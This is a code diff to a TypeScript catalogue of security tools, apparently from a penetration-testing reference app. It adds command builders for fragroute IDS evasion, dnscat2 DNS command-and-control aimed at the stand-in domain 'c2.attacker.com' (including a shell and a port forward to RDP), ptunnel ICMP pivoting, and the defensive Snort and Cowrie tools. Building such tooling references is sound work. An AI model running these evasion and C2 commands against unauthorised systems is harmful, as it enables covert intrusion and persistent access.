@@ -33,6 +33,37 @@ export const evasionTools: Tool[] = [
     relatedTools: ['fragrouter', 'nmap', 'scapy'],
     installation: 'sudo apt install fragroute -y',
     website: 'https://github.com/mikeryan/fragroute',
+    interactiveCommands: [
+      {
+        name: 'Fragroute IDS Evasion Builder',
+        description: 'Generate advanced packet manipulation commands to evade Intrusion Detection Systems.',
+        inputs: [
+          { id: 'mode', label: 'Configuration Mode', type: 'select', options: ['Echo Rules (Inline)', 'Config File (-f)'], defaultValue: 'Echo Rules (Inline)' },
+          { id: 'target', label: 'Target IP', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Destination IP address' },
+          { id: 'ipFrag', label: 'IP Fragmentation', type: 'text', defaultValue: '24', placeholder: 'Fragment size in bytes' },
+          { id: 'tcpSeg', label: 'TCP Segmentation', type: 'text', defaultValue: '8', placeholder: 'TCP segment size in bytes' },
+          { id: 'chaff', label: 'Insert Chaff', type: 'select', options: ['None', 'ip_chaff dup', 'ip_chaff opt'], defaultValue: 'None' },
+          { id: 'order', label: 'Packet Order', type: 'select', options: ['Sequential', 'order random', 'order reverse'], defaultValue: 'Sequential' },
+          { id: 'delay', label: 'Delay (ms)', type: 'text', defaultValue: '', placeholder: 'e.g., 10' }
+        ],
+        generator: (inputs) => {
+          if (inputs.mode === 'Config File (-f)') {
+            return `fragroute -f fragroute.conf ${inputs.target}`;
+          }
+          
+          let rules = [];
+          if (inputs.ipFrag) rules.push(`ip_frag ${inputs.ipFrag}`);
+          if (inputs.tcpSeg) rules.push(`tcp_seg ${inputs.tcpSeg}`);
+          if (inputs.chaff !== 'None') rules.push(inputs.chaff);
+          if (inputs.order !== 'Sequential') rules.push(inputs.order);
+          if (inputs.delay) rules.push(`delay ${inputs.delay}`);
+          
+          if (rules.length === 0) return `fragroute ${inputs.target}`;
+          
+          return `echo "${rules.join('\\n')}" | fragroute ${inputs.target}`;
+        }
+      }
+    ]
   },
   {
     id: 'dnscat2',
@@ -82,14 +113,31 @@ export const evasionTools: Tool[] = [
     website: 'https://github.com/iagox86/dnscat2',
     interactiveCommands: [
       {
-        name: 'DNS C2 Server Builder',
-        description: 'Generate the Dnscat2 server command with your domain and encryption settings.',
+        name: 'Dnscat2 C2 Tunnel Builder',
+        description: 'Generate Dnscat2 server and client commands for robust encrypted DNS tunneling.',
         inputs: [
-          { id: 'domain', label: 'Your C2 Domain', type: 'text', defaultValue: 'c2.attacker.com', placeholder: 'Your DNS domain pointing to your server' },
-          { id: 'secret', label: 'Shared Secret (encryption key)', type: 'text', defaultValue: 'mysecretkey', placeholder: 'Pre-shared key for encrypted tunnel' },
+          { id: 'component', label: 'Component', type: 'select', options: ['Server (Ruby)', 'Client (C)', 'Session Console'], defaultValue: 'Server (Ruby)' },
+          { id: 'domain', label: 'Your C2 Domain', type: 'text', defaultValue: 'c2.attacker.com', placeholder: 'Your DNS domain' },
+          { id: 'secret', label: 'Shared Secret (--secret)', type: 'text', defaultValue: 'mysecretkey', placeholder: 'Key for encrypted tunnel' },
+          { id: 'security', label: 'Security Level', type: 'select', options: ['authenticated', 'encrypted', 'open'], defaultValue: 'authenticated' },
+          { id: 'noCache', label: 'No Cache (--no-cache)', type: 'checkbox', defaultValue: 'true', placeholder: 'Disable caching' },
+          { id: 'port', label: 'Bind Port (--port)', type: 'text', defaultValue: '53', placeholder: 'Local port to listen on' }
         ],
         generator: (inputs) => {
-          return `ruby dnscat2.rb --dns "domain=${inputs.domain},host=0.0.0.0" --secret=${inputs.secret} --no-cache`;
+          if (inputs.component === 'Session Console') {
+            return `dnscat2> session -i 1\ndnscat2> shell\ndnscat2> listen 127.0.0.1:4444 10.10.10.5:3389`;
+          }
+          
+          if (inputs.component === 'Client (C)') {
+             return `./dnscat2 ${inputs.domain} --secret=${inputs.secret}`;
+          }
+          
+          let cmd = `ruby dnscat2.rb --dns "domain=${inputs.domain},host=0.0.0.0,port=${inputs.port}"`;
+          if (inputs.secret) cmd += ` --secret=${inputs.secret}`;
+          if (inputs.security && inputs.security !== 'authenticated') cmd += ` --security=${inputs.security}`;
+          if (inputs.noCache === 'true') cmd += ' --no-cache';
+          
+          return cmd;
         }
       }
     ]
@@ -133,17 +181,30 @@ export const evasionTools: Tool[] = [
     website: 'https://www.mit.edu/afs.new/sipb/user/golem/tmp/ptunnel-0.61.orig/web/',
     interactiveCommands: [
       {
-        name: 'ICMP Tunnel Builder',
-        description: 'Generate Ptunnel commands for both the relay server and the client.',
+        name: 'ICMP Tunneling Orchestrator',
+        description: 'Generate Ptunnel server and client commands to pivot TCP connections over Ping.',
         inputs: [
-          { id: 'relay', label: 'Relay/Proxy Host IP', type: 'text', defaultValue: '10.10.10.1', placeholder: 'IP of host running ptunnel server' },
-          { id: 'dest', label: 'Destination Host', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Final target IP' },
-          { id: 'destPort', label: 'Destination Port', type: 'text', defaultValue: '22', placeholder: '22 (SSH), 3389 (RDP)' },
-          { id: 'localPort', label: 'Local Port', type: 'text', defaultValue: '8080', placeholder: 'Port on your machine' },
-          { id: 'password', label: 'Tunnel Password', type: 'text', defaultValue: 'secretpass', placeholder: 'Shared authentication password' },
+          { id: 'mode', label: 'Mode', type: 'select', options: ['Client (Forwarder)', 'Server (Proxy/Relay)'], defaultValue: 'Client (Forwarder)' },
+          { id: 'relay', label: 'Relay Host IP (-p)', type: 'text', defaultValue: '10.10.10.1', placeholder: 'IP running ptunnel server' },
+          { id: 'dest', label: 'Destination Host (-da)', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Final target IP' },
+          { id: 'destPort', label: 'Dest. Port (-dp)', type: 'text', defaultValue: '22', placeholder: '22 (SSH), 3389 (RDP)' },
+          { id: 'localPort', label: 'Local Port (-lp)', type: 'text', defaultValue: '8080', placeholder: 'Port to bind locally' },
+          { id: 'password', label: 'Password (-x)', type: 'text', defaultValue: 'secretpass', placeholder: 'Shared authentication password' },
+          { id: 'verbose', label: 'Verbosity (-v)', type: 'select', options: ['None', '-v', '-vv', '-vvv'], defaultValue: '-v' }
         ],
         generator: (inputs) => {
-          return `# On relay server:\nptunnel -x ${inputs.password}\n\n# On attacker:\nptunnel -p ${inputs.relay} -lp ${inputs.localPort} -da ${inputs.dest} -dp ${inputs.destPort} -x ${inputs.password}\n\n# Then connect:\nssh user@localhost -p ${inputs.localPort}`;
+          let cmd = 'ptunnel';
+          
+          if (inputs.password) cmd += ` -x ${inputs.password}`;
+          if (inputs.verbose !== 'None') cmd += ` ${inputs.verbose}`;
+          
+          if (inputs.mode === 'Server (Proxy/Relay)') {
+            return cmd;
+          }
+          
+          cmd += ` -p ${inputs.relay} -lp ${inputs.localPort} -da ${inputs.dest} -dp ${inputs.destPort}`;
+          
+          return cmd + `\n\n# Connect using:\nssh user@localhost -p ${inputs.localPort}`;
         }
       }
     ]
@@ -187,6 +248,39 @@ export const evasionTools: Tool[] = [
     relatedTools: ['suricata', 'zeek', 'yara'],
     installation: 'sudo apt install snort -y',
     website: 'https://www.snort.org',
+    interactiveCommands: [
+      {
+        name: 'Snort Execution Builder',
+        description: 'Generate advanced Snort commands for packet capture, intrusion detection, and offline PCAP analysis.',
+        inputs: [
+          { id: 'mode', label: 'Operating Mode', type: 'select', options: ['IDS/IPS (Live)', 'Offline PCAP Analysis (-r)', 'Test Config (-T)'], defaultValue: 'IDS/IPS (Live)' },
+          { id: 'interface', label: 'Interface (-i)', type: 'text', defaultValue: 'eth0', placeholder: 'e.g., eth0, ens33' },
+          { id: 'config', label: 'Config File (-c)', type: 'text', defaultValue: '/etc/snort/snort.conf', placeholder: 'Path to snort.conf' },
+          { id: 'pcap', label: 'PCAP File (-r)', type: 'text', defaultValue: 'capture.pcap', placeholder: 'Required for Offline Mode' },
+          { id: 'alertMode', label: 'Alert Mode (-A)', type: 'select', options: ['fast', 'full', 'console', 'none'], defaultValue: 'fast' },
+          { id: 'logDir', label: 'Log Directory (-l)', type: 'text', defaultValue: '/var/log/snort', placeholder: 'Directory for alerts/logs' },
+          { id: 'daq', label: 'DAQ Module', type: 'text', defaultValue: '', placeholder: 'e.g., afpacket (for inline IPS)' }
+        ],
+        generator: (inputs) => {
+          let cmd = 'snort';
+          
+          if (inputs.mode === 'Test Config (-T)') cmd += ' -T';
+          
+          if (inputs.config) cmd += ` -c ${inputs.config}`;
+          if (inputs.alertMode !== 'full') cmd += ` -A ${inputs.alertMode}`;
+          if (inputs.logDir) cmd += ` -l ${inputs.logDir}`;
+          if (inputs.daq) cmd += ` --daq ${inputs.daq}`;
+          
+          if (inputs.mode === 'Offline PCAP Analysis (-r)') {
+            cmd += ` -r ${inputs.pcap}`;
+          } else {
+            cmd += ` -i ${inputs.interface}`;
+          }
+          
+          return cmd;
+        }
+      }
+    ]
   },
   {
     id: 'cowrie',
@@ -221,5 +315,29 @@ export const evasionTools: Tool[] = [
     relatedTools: ['kippo', 'dionaea', 'honeydb'],
     installation: 'git clone https://github.com/cowrie/cowrie.git && cd cowrie && pip3 install -r requirements.txt',
     website: 'https://github.com/cowrie/cowrie',
+    interactiveCommands: [
+      {
+        name: 'Cowrie Honeypot Controller',
+        description: 'Generate commands to start, stop, redirect traffic, and monitor the Cowrie honeypot.',
+        inputs: [
+          { id: 'action', label: 'Action', type: 'select', options: ['Start Cowrie', 'Stop Cowrie', 'Restart Cowrie', 'Setup Port Redirect (iptables)', 'Monitor Logs'], defaultValue: 'Start Cowrie' },
+          { id: 'extPort', label: 'External SSH Port', type: 'text', defaultValue: '22', placeholder: 'Port attackers connect to' },
+          { id: 'intPort', label: 'Cowrie Internal Port', type: 'text', defaultValue: '2222', placeholder: 'Port Cowrie listens on' },
+          { id: 'interface', label: 'Network Interface', type: 'text', defaultValue: 'eth0', placeholder: 'e.g., eth0' }
+        ],
+        generator: (inputs) => {
+          if (inputs.action === 'Start Cowrie') return 'bin/cowrie start';
+          if (inputs.action === 'Stop Cowrie') return 'bin/cowrie stop';
+          if (inputs.action === 'Restart Cowrie') return 'bin/cowrie restart';
+          if (inputs.action === 'Monitor Logs') return 'tail -f var/log/cowrie/cowrie.log';
+          
+          if (inputs.action.includes('iptables')) {
+            return `iptables -t nat -A PREROUTING -i ${inputs.interface} -p tcp --dport ${inputs.extPort} -j REDIRECT --to-port ${inputs.intPort}`;
+          }
+          
+          return '';
+        }
+      }
+    ]
   },
 ];
